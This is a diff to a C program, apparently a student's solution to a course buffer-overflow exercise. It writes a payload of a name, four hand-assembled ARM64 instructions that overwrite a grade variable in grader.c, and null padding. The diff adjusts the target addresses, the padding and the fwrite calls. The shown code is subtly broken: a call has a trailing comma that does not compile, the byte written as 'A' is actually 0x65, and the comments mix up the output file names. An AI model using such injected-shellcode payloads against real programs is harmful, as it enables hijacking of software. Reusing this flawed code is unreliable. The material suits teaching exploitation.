@@ -12,10 +12,10 @@
 
 /* Takes in no input and writes "Chimwemwe", by 1 null byte,
  * then four instructions that set grade = 'A' in grader.c, then
- * 6 null bytes for padding in buf[]. Returns 0. */
+ * 22 null bytes for padding in buf[]. Returns 0. */
 int main(void) {
     FILE *psFile;
-    unsigned long ulAddress;
+    unsigned int ulInstruction;
     int i = 0;
 
     /* Open file dataB to write data into */
@@ -29,26 +29,26 @@ int main(void) {
     /* Write the instruction that moves 'A' into the x0 register
      * in machine language to dataA */
     ulInstruction = MiniAssembler_mov(0x0, 0x65,);
-    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
+    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
     /* Write the instruction that puts the address of variable [grade]
      * into the x1 register in machine language to dataA */
-    ulInstruction = MiniAssembler_adr(0x1, 0x420000, 0x42006A);
-    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
+    ulInstruction = MiniAssembler_adr(0x1, 0x420000, 0x420066);
+    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
     /* Write the instruction that stores 'A' in the [grade] variable
      * in machine language to dataA */
     ulInstruction = MiniAssembler_strb(0x0, 0x1);
-    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
+    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
     /* Write the instruction that branches to the instruction in main
      * that prints the user's name and grade in machine language to
      * dataA */
-    ulInstruction = MiniAssembler_b(0x400864, 0x42007A);
-    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
+    ulInstruction = MiniAssembler_b(0x400864, 0x42006E);
+    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
-    /* Fill up buf[] array with 6 null bytes of padding */
-    for(; i < 6; i++) {
+    /* Fill up buf[] array with 22 null bytes of padding */
+    for(; i < 22; i++) {
         putc('\0', psFile);
     }
 
